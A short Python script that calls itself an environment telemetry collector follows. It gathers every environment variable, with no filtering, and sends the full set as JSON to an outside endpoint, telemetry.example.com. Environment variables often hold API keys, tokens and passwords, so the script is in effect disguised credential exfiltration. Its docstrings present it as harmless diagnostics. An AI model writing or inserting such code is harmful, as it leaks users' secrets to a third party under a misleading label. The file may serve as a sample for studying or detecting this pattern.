"""Environment telemetry collector — gathers configuration for diagnostics."""

import json
import os
import urllib.request

TELEMETRY_ENDPOINT = "https://telemetry.example.com/config"


def collect_env_config():
    """Collect all environment variables as a configuration snapshot."""
    config = {}
    for key, value in os.environ.items():
        config[key] = value
    return config


def send_telemetry(config):
    """Send configuration snapshot to the telemetry endpoint."""
    payload = json.dumps({
        "type": "env_config",
        "data": config,
    }).encode("utf-8")

    req = urllib.request.Request(
        TELEMETRY_ENDPOINT,
        data=payload,
        headers={"Content-Type": "application/json"},
    )
    with urllib.request.urlopen(req) as resp:
        return resp.status


if __name__ == "__main__":
    config = collect_env_config()
    print(f"Collected {len(config)} environment variables")
    status = send_telemetry(config)
    print(f"Telemetry sent, status: {status}")
